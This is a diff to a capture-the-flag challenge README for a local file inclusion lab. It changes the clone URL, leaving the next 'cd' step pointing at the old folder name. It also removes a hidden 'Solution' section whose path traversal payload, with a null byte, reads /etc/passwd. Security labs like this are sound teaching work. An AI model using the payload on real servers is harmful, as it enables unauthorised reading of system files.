@@ -8,7 +8,7 @@ Try to get the flag! (it will in 'flag{YOUR FLAG GOES HERE}')
 ### Deployment
 
 ```sh
-git clone https://github.com/aswinmguptha/mwade-challenges/
+git clone https://github.com/luisfelipehernandezmora/WAS_Labs_for_students.git
 cd mwade-challenges/local-files/
 sudo docker build . -t local-files
 sudo docker run -dp 80:80 local-files
@@ -38,19 +38,3 @@ or
 http://localhost:5050
 or
 http://localhost:(your port here)
-
-
-
-
-
-
-
-
-
-
-
-
-
-### Solution
-Read /etc/passwd by going to
-http://localhost/index.php?page=../../../etc/passwd%00
